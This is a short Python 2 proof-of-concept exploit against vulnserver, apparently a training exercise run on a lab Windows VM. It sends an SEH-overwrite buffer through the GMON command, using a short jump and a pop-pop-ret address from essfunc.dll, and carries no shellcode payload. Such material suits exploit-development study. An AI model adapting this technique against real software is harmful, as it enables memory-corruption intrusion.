#!/usr/bin/python

import socket
import os
import sys

host = '192.168.100.118'        # Windows VM
port = 9999                     # vulnserver port

nSeh = '\xeb\x06\x90\x90' # short jump 6 bytes over seh to land in C buffer
Seh = '\xb4\x10\x50\x62'  # 0x625010b4 - pop ebx, pop ebp, ret -  essfunc.dll

buffer = 'A' * 3494
buffer += nSeh
buffer += Seh
buffer += 'C' * (5012 - len(buffer))



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("GMON /.../" + buffer)
print s.recv(1024)
s.close()

